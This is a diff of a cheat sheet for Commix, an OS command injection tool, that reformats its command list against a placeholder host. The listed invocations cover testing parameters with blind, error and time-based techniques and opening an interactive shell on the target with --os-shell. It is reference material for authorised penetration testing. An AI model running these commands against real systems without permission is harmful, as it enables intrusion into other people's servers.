@@ -1,15 +1,43 @@
 [X] Commix Command List
-[\] commix -u "http://target.com/page.php?param=value" [/] Test URL for OS command injection
-[\] commix -u "http://target.com/page.php?param=value" --data "param=value" [/] Test POST parameter for command injection
-[\] commix -u "http://target.com/page.php?param=value" -p "param" [/] Specify parameter to test
-[\] commix -u "http://target.com/page.php?param=value" --technique=blind [/] Use blind command injection technique
-[\] commix -u "http://target.com/page.php?param=value" --technique=error [/] Use error-based command injection
-[\] commix -u "http://target.com/page.php?param=value" --technique=time [/] Use time-based command injection
-[\] commix -u "http://target.com/page.php?param=value" --os-shell [/] Establish interactive OS shell
-[\] commix -u "http://target.com/page.php?param=value" --current-user [/] Retrieve current user
-[\] commix -u "http://target.com/page.php?param=value" --whoami [/] Get current username
-[\] commix -u "http://target.com/page.php?param=value" -H "User-Agent: CustomUA" [/] Add custom HTTP header
-[\] commix -u "http://target.com/page.php?param=value" --cookie="session=value" [/] Use session cookie
-[\] commix -u "http://target.com/page.php?param=value" --output-dir=results/ [/] Save results to directory
-[\] commix -h [/] Show help menu
-[\] commix --version [/] Show Commix version
+
+[\] commix -u "http://target.com/page.php?param=value"
+[/] Test URL for OS command injection
+
+[\] commix -u "http://target.com/page.php?param=value" --data "param=value"
+[/] Test POST parameter for command injection
+
+[\] commix -u "http://target.com/page.php?param=value" -p "param"
+[/] Specify parameter to test
+
+[\] commix -u "http://target.com/page.php?param=value" --technique=blind
+[/] Use blind command injection technique
+
+[\] commix -u "http://target.com/page.php?param=value" --technique=error
+[/] Use error-based command injection
+
+[\] commix -u "http://target.com/page.php?param=value" --technique=time
+[/] Use time-based command injection
+
+[\] commix -u "http://target.com/page.php?param=value" --os-shell
+[/] Establish interactive OS shell
+
+[\] commix -u "http://target.com/page.php?param=value" --current-user
+[/] Retrieve current user
+
+[\] commix -u "http://target.com/page.php?param=value" --whoami
+[/] Get current username
+
+[\] commix -u "http://target.com/page.php?param=value" -H "User-Agent: CustomUA"
+[/] Add custom HTTP header
+
+[\] commix -u "http://target.com/page.php?param=value" --cookie="session=value"
+[/] Use session cookie
+
+[\] commix -u "http://target.com/page.php?param=value" --output-dir=results/
+[/] Save results to directory
+
+[\] commix -h
+[/] Show help menu
+
+[\] commix --version
+[/] Show Commix version
